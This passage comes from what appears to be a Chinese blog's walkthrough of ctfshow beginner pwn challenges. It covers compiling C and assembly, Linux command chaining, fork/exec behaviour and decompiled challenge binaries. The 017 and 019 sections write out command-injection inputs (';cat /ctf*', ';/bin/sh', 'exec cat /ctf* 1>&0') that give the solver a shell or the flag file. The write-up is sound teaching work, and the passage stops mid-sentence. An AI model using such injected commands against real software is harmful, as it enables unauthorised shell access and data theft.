fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 从打开的文件中读取数据，并将读取到的每个字节的位转换成字符串形式输出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  <span class="comment">// 外层的for循环(for (size_t i = 0; i &lt; n; i++))遍历了当前读取批次中的每个字节</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) &#123;  <span class="comment">// 内层的for循环(for (int j = 7; j &gt;= 0; j--))负责将每个字节的每一位转换为字符串</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;%d&quot;</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);  <span class="comment">// (buffer[i] &gt;&gt; j)是对字节buffer[i]进行右移操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) &#123;  <span class="comment">// 非最后一个字节就加下划线</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) &#123;  <span class="comment">// 非文件最后一部分就加空格</span></span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p>程序打开名为 “key” 的文件，以二进制（“rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1</p></li><li><p>然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。</p></li><li><p>接下来，程序开始将输出字符串初始化为 “ctfshow{”，然后进入一个循环，每次读取BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。</p></li><li><p>在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。</p></li><li><p>在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下划线作为分隔符。</p></li><li><p>如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。</p></li><li><p>循环结束后，程序在 output 字符串中添加 “}”，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。最后，程序关闭文件，并返回 0 表示成功执行。</p></li><li><p>该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出</p></li><li><p><code>echo &quot;CTFshow&quot;&gt;key</code> 使用<code>echo</code>工具输出到标准输出，通过重定向操作符<code>&gt;</code>，输出的内容被写入（或覆盖）到名为<code>key</code>的文件中。 创建一个含有字符串<code>CTFshow</code>的文件<code>key</code></p></li><li><p><code>gcc -o flag flag.c</code> 编译<code>flag.c</code>，生成一个名为<code>flag</code>的程序</p></li></ul><h3 id="015-编译汇编代码"><a class="header-anchor" href="#015-编译汇编代码">¶</a>015 编译汇编代码</h3><h4 id="汇编语言→目标文件→可执行文件"><a class="header-anchor" href="#汇编语言→目标文件→可执行文件">¶</a>汇编语言→目标文件→可执行文件</h4><p><code>nsam -f elf flag.asm -o flag.o</code> 将汇编代码编译为目标文件</p><p><code>ld -m elf_i386 -o flag flag.o</code> 将目标文件链接为可执行文件</p><p><code>./flag</code> 运行文件</p><h3 id="016-gcc编译-s文件"><a class="header-anchor" href="#016-gcc编译-s文件">¶</a>016 gcc编译.s文件</h3><ul><li>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。</li><li>汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处理，将其转换为可执行文件或目标文件。</li><li>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</li><li><code>gcc -o flag flag.s</code> 将.s文件编译为可执行文件</li></ul><h3 id="017-Linux基础命令的拼接"><a class="header-anchor" href="#017-Linux基础命令的拼接">¶</a>017 Linux基础命令的拼接</h3><ul><li>在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。</li><li>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</li><li><code>command1 ; command2 ; command3</code><ul><li>在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执command3 这样，多个命令可以按顺序在一行上执行。</li></ul></li><li><code>command1 &amp; command2</code></li><li>也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命令之间使用 &amp; 进行分隔</li><li>command1 和 command2 是两个要执行的命令。通过使用 &amp; 将它们连接起来，它们将同时在后台执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn017/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+Ah] [rbp-16h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="comment">/* 设置缓冲区行为。前一个可能用于清除.bss段的缓冲，后一个设置标准输入流为无缓冲模式 */</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_D48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DC0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E40);</span><br><span class="line">  <span class="built_in">puts</span>(asc_ED0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_F60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_FE8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : You should understand the basic command usage of Linux! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  *(_DWORD *)dest = <span class="number">790655852</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHow much do you know about Linux commands? \n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nEnter the command you want choose:(1.2.3.4 or 5)\n&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        system(<span class="string">&quot;id&quot;</span>); <span class="comment">/* 使用system调用执行id命令，显示当前用户的ID和组ID */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="comment">/* 读取用户输入的目录名，并将其附加到dest，然后使用system执行ls命令列出该目录的内容 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;... ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your flag is ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;flag is not here!&#125;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x14</span>u);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf?You haven&#x27;t left yet?\nOk~ give you flag:\nflag is loading......&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x1BF52</span>u);</span><br><span class="line">        system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);  </span><br><span class="line">        <span class="comment">/* 假装读取一个隐藏的标志文件，实际上在长时间延迟后才真正尝试读取文件，超过远程环境的时长，本地可以等等看hhhh */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;su: Authentication failure&quot;</span>);</span><br><span class="line">        <span class="comment">/* 模拟失败的身份验证尝试 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command not found!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这个程序存在明显的安全漏洞，比如在案例2中，strcat没有检查buf的长度，可能导致缓冲区溢出。此外，直接使用system函数执行用户提供的输入也存在命令注入的风险 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.id&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.ls&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.su&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这条直接pass.</li><li>其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限制了10字节，但是我们完全够用，可以构造出<code>;cat /ctf*</code> <code>;/bin/sh</code>等直接拿取一个shell或者直接读出flag</li><li>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。所以<code>cat /ctf*</code>能够读到flag</li></ul><h3 id="018-看源码喵"><a class="header-anchor" href="#018-看源码喵">¶</a>018 看源码喵</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn018/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Do you know redirect output ?                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which is the real flag?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fake</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">real</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>读取用户输入，是9执行fake()，不是9执行real()</li><li>看源码，两个函数的区别在于中间是<code>&gt;&gt;</code> 还是 <code>&gt;</code></li><li><code>system(&quot;echo 'flag is here'&gt;&gt;/ctfshow_flag&quot;);</code></li><li>这个命令将字符串 ‘flag is here’ <strong><u><em>追加写入</em></u></strong> /ctfshow_flag 文件中。 &gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 ‘flag is here’ 。</li><li><code>system(&quot;echo 'flag is here'&gt;/ctfshow_flag&quot;);</code></li><li>这个命令将字符串 ‘flag is here’ <strong><u><em>覆盖写入</em></u></strong> /ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 ‘flag is here’ 。</li><li>在远程环境中需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容乌拉！</li></ul><h3 id="019-父子进程（还是有一点点懵"><a class="header-anchor" href="#019-父子进程（还是有一点点懵">¶</a>019 父子进程（还是有一点点懵</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn019/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Turn off output, how to get flag? &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( fork() )  <span class="comment">// 父进程</span></span><br><span class="line">  <span class="comment">/* fork系统调用创建了一个子进程，使得当前进程的副本运行。父进程和子进程共享相同的代码，但有独立的进程上下文。如果fork成功，它返回子进程的PID给父进程，而在子进程中返回0 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0LL</span>);  <span class="comment">/* 父进程在这里等待任何子进程的终止。wait系统调用会阻塞直到一个子进程结束 */</span></span><br><span class="line">    sleep(<span class="number">3u</span>);  <span class="comment">/* 让父进程休眠三秒，给子进程足够的时间执行 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>  <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line">    fclose(_bss_start);  <span class="comment">// 关闭文件输出流</span></span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);  <span class="comment">// 从标准输入中读取用户输入的命令，并存储在 buf 中</span></span><br><span class="line">    system(buf);  <span class="comment">// 执行用户输入的命令</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 程序设计了一个简单的父子进程交互，其中子进程提供了用户一个shell，让用户尝试找到旗帜 */</span></span><br></pre></td></tr></table></figure></div><ul><li><p>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</p></li><li><p>在父进程中：<code>wait(0LL)</code> : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完毕。</p></li><li><p><code>sleep(3u)</code> 父进程睡眠3秒钟。</p></li><li><p><code>printf(&quot;flag is not here!&quot;)</code> 输出提示信息，表明flag不在此处</p></li><li><p>在子进程中：puts(“give you a shell! now you need to get flag!”) : 输出提示信息，表示给予用户一个shell，让其获取flag。</p><ul><li><code>fclose()</code> 关闭文件输出流。</li><li><code>read(0, &amp;buf, 0x20uLL)</code> 从标准输入中读取用户输入的命令，并存储在 buf 中</li><li><code>system(&amp;buf)</code> 执行用户输入的命令。</li></ul></li><li><p>我们可以使用了 <code>exec 函数来执行sh命令</code>，并使用 <code>1&gt;&amp;0 来进行输出重定向</code>。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p></li><li><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p></li><li><p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0</code> 将 <code>cat /ctf*</code>命令的输出发送到标准输入，实际上就是将命令的输出再次输出到屏幕上。</p><ol><li><strong>执行<code>cat</code>命令</strong>：<code>exec</code>系统调用用于替换当前进程的映像，即它将当前正在运行的程序替换成由其参数指定的新程序。在这个例子中，新程序是<code>cat</code>命令</li><li><strong>查找并显示旗帜文件</strong>：<code>cat 